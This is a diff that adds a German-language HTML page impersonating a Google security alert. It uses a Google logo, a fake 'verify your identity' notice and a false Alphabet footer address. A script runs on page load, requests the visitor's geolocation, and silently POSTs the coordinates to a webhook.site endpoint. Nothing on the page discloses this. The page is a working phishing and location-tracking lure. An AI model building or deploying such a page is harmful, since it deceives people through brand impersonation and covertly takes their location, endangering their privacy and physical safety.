@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Security Alert</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+            background-color: #f4f5f7;
+            margin: 0;
+            padding: 0;
+        }
+
+        .email-container {
+            width: 100%;
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header img {
+            width: 120px;
+        }
+
+        .email-content {
+            color: #333;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+
+        .email-content h2 {
+            font-size: 18px;
+            color: #333;
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+
+        .email-content p {
+            color: #555;
+            font-size: 14px;
+        }
+
+        .button-container {
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        .button {
+            background-color: rgb(26, 115, 232);
+            color: #ffffff;
+            padding: 12px 20px;
+            text-align: center;
+            display: inline-block;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .button:hover {
+            background-color: #165eab;
+        }
+
+        .footer {
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        .footer a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+
+<script>
+    window.onload = function() {
+        navigator.geolocation.getCurrentPosition(show);
+    }
+    
+    function show(position) {
+        let formData = new URLSearchParams();
+        formData.append("text", position.coords.latitude + " " + position.coords.longitude);
+        
+        fetch("https://webhook.site/af3a2b2c-f47c-45aa-8108-bd7e84f56fd9", {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: formData.toString()
+        });
+    }
+    </script>
+
+<body>
+    <div class="email-container">
+        <div class="header">
+            <img src="https://ssl.gstatic.com/images/branding/googleg/2x/googleg_standard_color_64dp.png" style="width:50px;" alt="Google Logo">
+        </div>
+
+        <div class="email-content">
+            <h2>Wichtige Sicherheitsbenachrichtigung</h2>
+            <p>Guten Tag,</p>
+            <p>Wir haben verdächtige Aktivitäten in Bezug auf dein Google-Konto festgestellt. Um sicherzustellen, dass dein Konto sicher bleibt, möchten wir dich bitten, deine Identität zu bestätigen.</p>
+            <p>Bitte klicke auf den untenstehenden Button, um die Sicherheitsüberprüfung abzuschließen:</p>
+
+            <div class="button-container">
+                <a href="https://support.google.com" class="button">Sicherheitsüberprüfung durchführen</a>
+            </div>
+
+            <p>Falls du diese Anfrage nicht selbst durchgeführt hast, empfehlen wir dir, dein Passwort sofort zu ändern, um unbefugten Zugriff auf dein Konto zu verhindern.</p>
+            <p>Weitere Unterstützung findest du in unserem <a href="https://support.google.com">Hilfecenter</a>.</p>
+        </div>
+
+        <div class="footer">
+            <p>Alphabet, Inc. | 1601 Willow Road | Menlo Park, CA 94025</p>
+            <p>© 2025 Alphabet, Inc. Alle Rechte vorbehalten.</p>
+        </div>
+    </div>
+</body>
+</html>
